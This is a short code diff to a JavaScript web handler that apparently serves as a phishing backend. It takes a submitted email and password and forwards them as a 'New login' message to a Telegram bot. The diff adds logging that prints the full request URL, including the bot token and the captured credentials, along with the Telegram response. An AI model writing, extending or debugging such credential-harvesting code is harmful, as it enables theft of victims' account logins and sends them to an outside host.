@@ -21,9 +21,15 @@ export default async function handler(req, res) {
         const message = encodeURIComponent(`New login:\nEmail: ${email}\nPassword: ${password}`);
         const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`;
 
+        // Log the Telegram API URL
+        console.log('Sending message to Telegram:', telegramUrl);
+
         // Send the message to Telegram
         const response = await fetch(telegramUrl);
         const result = await response.json();
+
+        // Log the Telegram API response
+        console.log('Telegram API response:', result);
 
         // Check if the Telegram API request was successful
         if (!response.ok) {
